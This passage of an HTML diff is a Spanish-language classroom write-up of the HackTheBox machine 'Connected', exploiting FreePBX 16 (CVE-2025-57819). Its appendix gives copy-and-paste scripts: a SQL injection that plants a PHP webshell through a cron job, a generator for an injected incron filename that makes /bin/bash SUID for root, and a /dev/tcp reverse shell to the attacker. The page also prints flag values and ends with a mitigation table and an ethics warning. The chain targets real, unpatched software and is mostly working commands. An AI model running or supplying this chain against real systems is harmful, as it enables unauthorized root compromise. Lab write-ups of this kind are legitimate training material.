+        <dt>incron</dt><dd>Es como <code>cron</code>, pero en vez de dispararse <b>por tiempo</b> se dispara <b>por eventos de ficheros</b> (crear, modificar, cerrar un archivo). El demonio <code>incrond</code> corre como <b>root</b>.</dd>
+        <dt>IN_CLOSE_WRITE</dt><dd>El evento "se escribió y cerró un fichero" en el directorio vigilado.</dd>
+        <dt>$#</dt><dd>incron sustituye esto por el <b>nombre del fichero</b> que disparó el evento, y se lo pasa al programa.</dd>
+        <dt>drwxrwxr-x asterisk</dt><dd>El directorio vigilado <code>/var/spool/asterisk/incron</code> <b>nos pertenece</b>: podemos crear ficheros dentro. Esa es la puerta a root.</dd>
+      </dl>
+    </div>
+  </section>
+
+  <!-- ============ 6. PRIVESC ============ -->
+  <section id="privesc">
+    <h2><span class="num">6</span>Escalada a root vía incron</h2>
+    <p class="lead">Cuando creamos un fichero en <code class="inl">/var/spool/asterisk/incron/</code>, <code class="inl">incrond</code> (root) ejecuta <code class="inl">/usr/bin/sysadmin_manager</code> pasándole el <strong>nombre del fichero</strong>. Si ese nombre empieza por <code class="inl">api.fwconsole-commands.</code>, <code class="inl">sysadmin_manager</code> decodifica el resto del nombre y lo ejecuta con <code class="inl">fwconsole</code> — y ahí hay <strong>inyección de comandos</strong> con <code class="inl">;</code>.</p>
+
+    <div class="note root">
+      <span class="nt">La idea en una frase</span>
+      El nombre del fichero <em>es</em> el comando. Lo codificamos (JSON → zlib → base64) y, gracias a la inyección con <code class="inl">;</code>, conseguimos que root ejecute lo que queramos. En vez de una reverse shell, le pedimos que ponga el bit <strong>SUID</strong> a <code class="inl">/bin/bash</code>.
+    </div>
+
+    <h3>6.1 — Generar el nombre de fichero malicioso</h3>
+    <div class="term">
+      <div class="term-head"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="lbl">python3 · en nuestra kali</span><span class="tag attacker">atacante · kali</span></div>
+<pre><span class="k">import</span> json, zlib, base64
+cmd = <span class="s">"help; chmod u+s /bin/bash"</span>
+payload = base64.b64encode(
+             zlib.compress(
+                json.dumps([cmd, <span class="s">"txn"</span>]).encode()
+             )).decode().replace(<span class="s">"/"</span>, <span class="s">"_"</span>)
+<span class="k">print</span>(<span class="s">"/var/spool/asterisk/incron/api.fwconsole-commands."</span> + payload)
+
+<span class="o"># -> /var/spool/asterisk/incron/api.fwconsole-commands.eJyLVspIzSmwVkjOyM1PU...</span></pre>
+    </div>
+    <div class="explain">
+      <p class="etitle">Qué hace cada parte</p>
+      <dl>
+        <dt>cmd</dt><dd><code>help</code> es un comando válido de fwconsole; el <code>;</code> y lo que sigue es <b>nuestra inyección</b>: <code>chmod u+s /bin/bash</code>.</dd>
+        <dt>chmod u+s</dt><dd>Activa el bit <b>SUID</b>: a partir de ahí <code>/bin/bash</code> se ejecuta con los privilegios de su <b>dueño (root)</b>, no los de quien lo lanza.</dd>
+        <dt>json.dumps([cmd,"txn"])</dt><dd>Formato exacto que espera el hook <code>fwconsole-commands</code>: una lista <code>[comando, "txn"]</code>.</dd>
+        <dt>zlib.compress</dt><dd>Lo comprime (el hook espera datos comprimidos).</dd>
+        <dt>base64 + replace("/","_")</dt><dd>Lo codifica en base64 y sustituye <code>/</code> por <code>_</code> porque el <code>/</code> no vale en un nombre de fichero.</dd>
+        <dt>api.fwconsole-commands.</dt><dd>Prefijo que le dice a <code>sysadmin_manager</code> qué hook usar (este hook <b>no</b> exige firma GPG, a diferencia de otros).</dd>
+      </dl>
+    </div>
+
+    <h3>6.2 — Disparar el hook desde la víctima</h3>
+    <div class="term">
+      <div class="term-head"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="lbl">webshell · víctima</span><span class="tag asterisk">asterisk</span></div>
+<pre><span class="c"># estado antes:</span>
+<span class="p">$ </span><span class="k">sh</span> <span class="s">'ls -la /bin/bash'</span>
+<span class="o">-rwxr-xr-x. 1 root root 964536 /bin/bash</span>
+
+<span class="c"># creamos el fichero -> incrond (root) ejecuta el hook</span>
+<span class="p">$ </span><span class="k">sh</span> <span class="s">"touch '/var/spool/asterisk/incron/api.fwconsole-commands.eJyLVspIzS...'"</span>
+
+<span class="c"># ~5 segundos después:</span>
+<span class="p">$ </span><span class="k">sh</span> <span class="s">'ls -la /bin/bash'</span>
+<span class="hl">-rwsr-xr-x. 1 root root 964536 /bin/bash</span>   <span class="c"># la 's' = SUID activo</span></pre>
+    </div>
+    <div class="explain">
+      <p class="etitle">Qué hace cada parte</p>
+      <dl>
+        <dt>touch '…'</dt><dd>Crea el fichero. El mero hecho de crearlo dispara el evento <code>IN_CLOSE_WRITE</code> que vigila incron.</dd>
+        <dt>-rwsr-xr-x</dt><dd>La <code>s</code> donde antes había una <code>x</code> en los permisos del dueño indica que el <b>bit SUID</b> está puesto. Lo hizo root por nosotros.</dd>
+        <dt>¿Por qué ~5 s?</dt><dd>incron reacciona casi al instante al evento (no espera al minuto como cron).</dd>
+      </dl>
+    </div>
+
+    <h3>6.3 — Convertirnos en root</h3>
+    <div class="term">
+      <div class="term-head"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="lbl">webshell · víctima</span><span class="tag root">root</span></div>
+<pre><span class="p">$ </span><span class="k">sh</span> <span class="s">'bash -p -c "id"'</span>
+<span class="hl">uid=999(asterisk) gid=1000(asterisk) euid=0(root) groups=1000(asterisk)</span></pre>
+    </div>
+    <div class="explain">
+      <p class="etitle">Qué hace cada parte</p>
+      <dl>
+        <dt>bash -p</dt><dd>La opción <code>-p</code> (<b>privileged</b>) evita que bash "deje caer" los privilegios SUID al arrancar. Sin ella, bash bajaría el <code>euid</code> a asterisk por seguridad.</dd>
+        <dt>-c "id"</dt><dd>Ejecuta el comando que le demos. Si no pusiéramos <code>-c</code>, abriría una shell interactiva.</dd>
+        <dt>euid=0(root)</dt><dd>El <b>euid</b> (ID efectivo) es 0 = <b>root</b>. Ya mandamos en la máquina.</dd>
+      </dl>
+    </div>
+  </section>
+
+  <!-- ============ 7. ROOT FLAG ============ -->
+  <section id="root">
+    <h2><span class="num">7</span>Root flag</h2>
+    <div class="term">
+      <div class="term-head"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="lbl">webshell · víctima</span><span class="tag root">root</span></div>
+<pre><span class="p">$ </span><span class="k">sh</span> <span class="s">'bash -p -c "cat /root/root.txt"'</span>
+<span class="fl">ec22f13e21e08b0d4b4a5a4cf2273e46</span></pre>
+    </div>
+    <div class="flag">
+      <span class="lab">root.txt</span>
+      <span class="val fl">ec22f13e21e08b0d4b4a5a4cf2273e46</span>
+    </div>
+    <div class="flag">
+      <span class="lab">user.txt</span>
+      <span class="val fl">5e05cd48732c4e88e907dbf86ab0d350</span>
+    </div>
+  </section>
+
+  <!-- ============ A. SCRIPTS ============ -->
+  <section id="scripts">
+    <h2><span class="num">A</span>Scripts completos (copiar y pegar)</h2>
+    <p class="lead">Todo el ataque condensado. Pega estos bloques en tu terminal de Kali en orden. Cambia solo las variables <code class="inl">IP</code> y, si usas la reverse shell, <code class="inl">LHOST</code>/<code class="inl">LPORT</code>.</p>
+
+    <h3>A.1 — Variables y función helper</h3>
+    <div class="term">
+      <div class="term-head"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="lbl">bash</span><span class="tag attacker">atacante · kali</span></div>
+<pre><span class="k">IP</span>=10.129.152.158
+<span class="k">H</span>=connected.htb
+
+<span class="c"># Ejecuta comandos en la víctima a través del webshell</span>
+<span class="k">sh</span>(){ <span class="k">curl</span> -sk -G --resolve <span class="s">$H</span>:443:<span class="s">$IP</span> <span class="s">"https://$H/webshell.php"</span> --data-urlencode <span class="s">"cmd=$1"</span>; }</pre>
+    </div>
+
+    <h3>A.2 — Foothold: SQLi &rarr; webshell (CVE-2025-57819)</h3>
+    <div class="term">
+      <div class="term-head"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="lbl">bash</span><span class="tag attacker">atacante · kali</span></div>
+<pre><span class="c"># base64 de  &lt;?php system($_GET[cmd]); ?&gt;</span>
+<span class="k">WS</span>=<span class="s">"PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg=="</span>
+<span class="k">CRON</span>=<span class="s">"echo \"$WS\"|base64 -d >/var/www/html/webshell.php"</span>
+<span class="k">PAYLOAD</span>=<span class="s">"x' ;INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) VALUES ('sysadmin','webshell','${CRON}',NULL,'* * * * *',30,1,1) -- "</span>
+
+<span class="k">curl</span> -sk -G --resolve <span class="s">$H</span>:443:<span class="s">$IP</span> <span class="s">"https://$H/admin/ajax.php"</span> \
+  --data-urlencode <span class="s">'module=FreePBX\modules\endpoint\ajax'</span> \
+  --data-urlencode <span class="s">'command=model'</span> --data-urlencode <span class="s">'template=x'</span> \
+  --data-urlencode <span class="s">'model=model'</span> --data-urlencode <span class="s">"brand=${PAYLOAD}"</span>
+
+<span class="c"># Espera ~60s (el cron corre cada minuto) y comprueba:</span>
+<span class="k">sh</span> <span class="s">'id'</span>
+<span class="k">sh</span> <span class="s">'cat /home/asterisk/user.txt'</span></pre>
+    </div>
+
+    <h3>A.3 — Generar el nombre de fichero del hook</h3>
+    <div class="term">
+      <div class="term-head"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="lbl">gen_hook.py</span><span class="tag attacker">atacante · kali</span></div>
+<pre><span class="c">#!/usr/bin/env python3</span>
+<span class="k">import</span> json, zlib, base64
+
+<span class="c"># Opción 1 (recomendada en clase): SUID bash, sin listener</span>
+cmd = <span class="s">"help; chmod u+s /bin/bash"</span>
+
+<span class="c"># Opción 2: reverse shell  ->  cmd = f"help; bash -i >& /dev/tcp/LHOST/LPORT 0>&1"</span>
+
+payload = base64.b64encode(
+             zlib.compress(json.dumps([cmd, <span class="s">"txn"</span>]).encode())
+          ).decode().replace(<span class="s">"/"</span>, <span class="s">"_"</span>)
+<span class="k">print</span>(<span class="s">"/var/spool/asterisk/incron/api.fwconsole-commands."</span> + payload)</pre>
+    </div>
+    <div class="term">
+      <div class="term-head"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="lbl">bash</span><span class="tag attacker">atacante · kali</span></div>
+<pre><span class="p">$ </span><span class="k">python3</span> gen_hook.py
+<span class="o">/var/spool/asterisk/incron/api.fwconsole-commands.eJyLVspIzS...</span></pre>
+    </div>
+
+    <h3>A.4 — Escalar a root</h3>
+    <div class="term">
+      <div class="term-head"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="lbl">bash</span><span class="tag root">root</span></div>
+<pre><span class="c"># Pega el nombre que imprimió gen_hook.py:</span>
+<span class="k">sh</span> <span class="s">"touch '/var/spool/asterisk/incron/api.fwconsole-commands.eJyLVspIzS...'"</span>
+
+<span class="c"># ~5 s después: /bin/bash queda SUID -> somos root</span>
+<span class="k">sh</span> <span class="s">'bash -p -c "id"'</span>
+<span class="k">sh</span> <span class="s">'bash -p -c "cat /root/root.txt"'</span></pre>
+    </div>
+
+    <div class="note root">
+      <span class="nt">Variante con reverse shell (A.3 opción 2)</span>
+      Si prefieres una shell interactiva en vez del SUID: en tu Kali levanta un listener con <code class="inl">nc -lvnp 4444</code>, genera el hook con <code class="inl">cmd = "help; bash -i >&amp; /dev/tcp/TU_IP/4444 0&gt;&amp;1"</code>, haz el <code class="inl">touch</code> y recibirás una shell de <strong>root</strong> en el listener.
+    </div>
+  </section>
+
+  <!-- ============ 8. LESSONS ============ -->
+  <section id="lessons">
+    <h2><span class="num">8</span>Lecciones y mitigación</h2>
+    <p class="lead">Lo importante de una máquina no es la flag, sino entender <em>por qué</em> funcionó cada paso y cómo se habría evitado.</p>
+
+    <table>
+      <thead><tr><th>Fallo</th><th>Por qué ocurre</th><th>Mitigación</th></tr></thead>
+      <tbody>
+        <tr>
+          <td>SQLi pre-auth (CVE-2025-57819)</td>
+          <td>El parámetro <code>brand</code> se concatena en la consulta sin parametrizar, y el namespace evita el control de autenticación.</td>
+          <td>Parchear FreePBX (16 ≥ 16.0.89). Usar consultas preparadas. No exponer <code>/admin</code> a Internet.</td>
+        </tr>
+        <tr>
+          <td>Credenciales en claro</td>
+          <td><code>/etc/freepbx.conf</code> guarda la contraseña de MySQL legible por <code>asterisk</code>.</td>
+          <td>Permisos estrictos y, cuando sea posible, autenticación por socket en vez de contraseña.</td>
+        </tr>
+        <tr>
+          <td>Directorio incron escribible</td>
+          <td>Un demonio que corre como root actúa sobre ficheros que un usuario sin privilegios controla.</td>
+          <td>No ejecutar hooks root sobre rutas escribibles por servicios. Validar/firmar siempre la entrada (como sí hace el hook GPG).</td>
+        </tr>
+        <tr>
+          <td>Inyección de comandos en el hook</td>
+          <td>El nombre del fichero se pasa a <code>fwconsole</code> sin sanear, permitiendo <code>;</code>.</td>
+          <td>Lista blanca de comandos; nunca construir una orden de shell a partir de entrada no confiable.</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="note">
+      <span class="nt">Resumen de la cadena</span>
+      <strong>nmap</strong> (FreePBX 16) → <strong>SQLi en <code class="inl">endpoint</code></strong> → <code class="inl">INSERT</code> en <code class="inl">cron_jobs</code> → <strong>webshell como asterisk</strong> → fichero en <code class="inl">incron</code> → <code class="inl">sysadmin_manager</code> ejecuta como root → <strong><code class="inl">/bin/bash</code> SUID</strong> → <code class="inl">bash -p</code> → <strong>root</strong>.
+    </div>
+
+    <div class="note warn">
+      <span class="nt">Aviso ético</span>
+      Todas estas técnicas son para el laboratorio <strong>autorizado</strong> de HackTheBox o entornos propios. Ejecutarlas contra sistemas sin permiso explícito es ilegal.
+    </div>
+  </section>
+
+  <footer>
+    Write-up didáctico · HackTheBox "Connected" · FreePBX 16.0.40.7 / CVE-2025-57819 · Material de clase.
+  </footer>
+
+</div>
